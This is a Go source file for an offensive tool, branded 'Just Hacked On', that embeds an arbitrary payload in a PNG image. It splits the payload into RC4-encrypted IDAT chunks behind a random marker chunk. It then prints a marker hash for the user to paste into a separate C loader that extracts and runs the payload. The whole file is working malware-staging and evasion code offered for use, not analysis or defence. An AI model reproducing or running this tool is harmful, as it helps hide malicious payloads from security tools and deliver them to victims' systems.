package main

import (
	"crypto/rand"
	"crypto/rc4"
	"encoding/binary"
	"flag"
	"fmt"
	"hash/crc32"
	"io"
	"os"
	"path/filepath"

	"github.com/fatih/color"
)

// Constants
const (
	IDAT         = "\x49\x44\x41\x54"                                 // 'IDAT'
	IEND         = "\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82" // PNG file footer
	MAX_IDAT_LNG = 8192                                               // Maximum size of each IDAT chunk
	RC4_KEY_LNG  = 16                                                 // RC4 key size
	PNG_HEADER   = "\x89PNG\r\n\x1a\n"                                // PNG file header
	LOG_FILE     = "output_log.txt"                                   // Output log file
)

// ASCII Art for "Just Hacked On"
const asciiArt = `
     ██╗██╗   ██╗███████╗████████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗      ██████╗ ███╗   ██╗
     ██║██║   ██║██╔════╝╚══██╔══╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔═══██╗████╗  ██║
     ██║██║   ██║███████╗   ██║       ███████║███████║██║     █████╔╝ █████╗  ██║  ██║    ██║   ██║██╔██╗ ██║
██   ██║██║   ██║╚════██║   ██║       ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║    ██║   ██║██║╚██╗██║
╚█████╔╝╚██████╔╝███████║   ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝    ╚██████╔╝██║ ╚████║
 ╚════╝  ╚═════╝ ╚══════╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝      ╚═════╝ ╚═╝  ╚═══╝
                                                                   Abdul Ahad   ==> Security Just an illusion
`

// Global log file
var logFile *os.File

// Initialize log file
func initLogFile() error {
	var err error
	logFile, err = os.OpenFile(LOG_FILE, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("[!] Failed to open log file: %v", err)
	}
	return nil
}

// Write to both terminal and log file
func logToFileAndPrint(data string) {
	fmt.Fprintln(logFile, data) // Write to file
	fmt.Println(data)           // Write to terminal
}

// Print colored output and log to file
func printRed(data string) {
	coloredData := color.RedString(data)
	logToFileAndPrint(coloredData)
}

func printYellow(data string) {
	coloredData := color.YellowString(data)
	logToFileAndPrint(coloredData)
}

func printCyan(data string) {
	coloredData := color.CyanString(data)
	logToFileAndPrint(coloredData)
}

func printWhite(data string) {
	coloredData := color.WhiteString(data)
	logToFileAndPrint(coloredData)
}

func printBlue(data string) {
	coloredData := color.BlueString(data)
	logToFileAndPrint(coloredData)
}

// Print ASCII art and name
func printHeader() {
	logToFileAndPrint(asciiArt)
	boldName := color.New(color.Bold).Sprint("www.justhackedon.org")
	logToFileAndPrint(boldName)
	logToFileAndPrint("") // Add a blank line
}

// Generate random bytes
func generateRandomBytes(length int) ([]byte, error) {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		return nil, err
	}
	return bytes, nil
}

// Calculate CRC32 for chunk
func calculateChunkCRC(chunkData []byte) uint32 {
	return crc32.ChecksumIEEE(chunkData)
}

// Create IDAT section
func createIDATSection(buffer []byte) ([]byte, uint32, error) {
	if len(buffer) > MAX_IDAT_LNG {
		printRed("[!] Input Data Is Bigger Than IDAT Section Limit")
		os.Exit(1)
	}

	// Create IDAT chunk length
	idatChunkLength := make([]byte, 4)
	binary.BigEndian.PutUint32(idatChunkLength, uint32(len(buffer)))

	// Compute CRC
	idatData := append([]byte(IDAT), buffer...)
	idatCRC := calculateChunkCRC(idatData)
	idatCRCBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(idatCRCBytes, idatCRC)

	// Combine to form IDAT section
	idatSection := append(idatChunkLength, idatData...)
	idatSection = append(idatSection, idatCRCBytes...)

	printWhite(fmt.Sprintf("[>] Created IDAT Of Length [%d] And Hash [0x%x]", len(buffer), idatCRC))
	return idatSection, idatCRC, nil
}

// Remove bytes from end of file
func removeBytesFromEnd(filePath string, bytesToRemove int) error {
	f, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	fileInfo, err := f.Stat()
	if err != nil {
		return err
	}

	fileSize := fileInfo.Size()
	err = f.Truncate(fileSize - int64(bytesToRemove))
	if err != nil {
		return err
	}
	return nil
}

// Encrypt data with RC4
func encryptRC4(key, data []byte) ([]byte, error) {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return nil, err
	}
	encrypted := make([]byte, len(data))
	cipher.XORKeyStream(encrypted, data)
	return encrypted, nil
}

// Plant payload in PNG
func plantPayloadInPNG(ipngFname, opngFname string, pngBuffer []byte) (uint32, error) {
	// Copy input PNG to output
	err := copyFile(ipngFname, opngFname)
	if err != nil {
		return 0, err
	}

	// Remove IEND footer
	err = removeBytesFromEnd(opngFname, len(IEND))
	if err != nil {
		return 0, err
	}

	// Mark start of payload with special IDAT section
	randBytes := make([]byte, 1)
	_, err = rand.Read(randBytes)
	if err != nil {
		return 0, err
	}
	randomLength := 16 + int(randBytes[0])%241 // Random between 16 and 256
	markBytes, err := generateRandomBytes(randomLength)
	if err != nil {
		return 0, err
	}
	markIDAT, specialIDATCRC, err := createIDATSection(markBytes)
	if err != nil {
		return 0, err
	}

	f, err := os.OpenFile(opngFname, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return 0, err
	}
	defer f.Close()

	_, err = f.Write(markIDAT)
	if err != nil {
		return 0, err
	}

	// Add payload as IDAT sections
	for i := 0; i < len(pngBuffer); i += (MAX_IDAT_LNG - RC4_KEY_LNG) {
		rc4Key, err := generateRandomBytes(RC4_KEY_LNG)
		if err != nil {
			return 0, err
		}

		chunkSize := len(pngBuffer) - i
		if chunkSize > (MAX_IDAT_LNG - RC4_KEY_LNG) {
			chunkSize = MAX_IDAT_LNG - RC4_KEY_LNG
		}

		encryptedData, err := encryptRC4(rc4Key, pngBuffer[i:i+chunkSize])
		if err != nil {
			return 0, err
		}

		idatChunkData := append(rc4Key, encryptedData...)
		idatSection, _, err := createIDATSection(idatChunkData) // Ignore idatCRC as it's not used
		if err != nil {
			return 0, err
		}

		printCyan(fmt.Sprintf("[i] Encrypted IDAT With RC4 Key: %x", rc4Key))
		_, err = f.Write(idatSection)
		if err != nil {
			return 0, err
		}
	}

	// Add IEND footer
	_, err = f.Write([]byte(IEND))
	if err != nil {
		return 0, err
	}

	return specialIDATCRC, nil
}

// Copy file utility
func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	_, err = io.Copy(dstFile, srcFile)
	return err
}

// Check if file is PNG
func isPNG(filePath string) bool {
	f, err := os.Open(filePath)
	if err != nil {
		printRed(fmt.Sprintf("[!] '%s' does not exist", filePath))
		return false
	}
	defer f.Close()

	header := make([]byte, 8)
	_, err = f.Read(header)
	if err != nil {
		printRed(fmt.Sprintf("[!] Error: %v", err))
		return false
	}
	return string(header) == PNG_HEADER
}

// Read payload file
func readPayload(filePath string) ([]byte, error) {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return nil, fmt.Errorf("[!] '%s' does not exist", filePath)
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		printRed(fmt.Sprintf("[!] Error: %v", err))
		return nil, err
	}
	return data, nil
}

func main() {
	// Initialize log file
	err := initLogFile()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer logFile.Close()

	// Print ASCII art and name
	printHeader()

	inputFile := flag.String("i", "", "Input payload file")
	pngFile := flag.String("png", "", "Input PNG file to embed the payload into")
	outputFile := flag.String("o", "", "Output PNG file name")
	flag.Parse()

	if *inputFile == "" || *pngFile == "" || *outputFile == "" {
		printRed("Usage: embed -i <input_payload> -png <input_png> -o <output_png>")
		os.Exit(1)
	}

	if filepath.Ext(*outputFile) != ".png" {
		*outputFile += ".png"
	}

	if !isPNG(*pngFile) {
		printRed(fmt.Sprintf("[!] '%s' is not a valid PNG file.", *pngFile))
		os.Exit(1)
	}

	payloadData, err := readPayload(*inputFile)
	if err != nil {
		os.Exit(1)
	}

	specialIDATCRC, err := plantPayloadInPNG(*pngFile, *outputFile, payloadData)
	if err != nil {
		printRed(fmt.Sprintf("[!] Error: %v", err))
		os.Exit(1)
	}

	printYellow(fmt.Sprintf("[*] '%s' is created!", *outputFile))
	printWhite("[i] Copy The Following To Your Code: \n")
	printBlue(fmt.Sprintf("#define MARKED_IDAT_HASH\t 0x%X\n", specialIDATCRC))
}
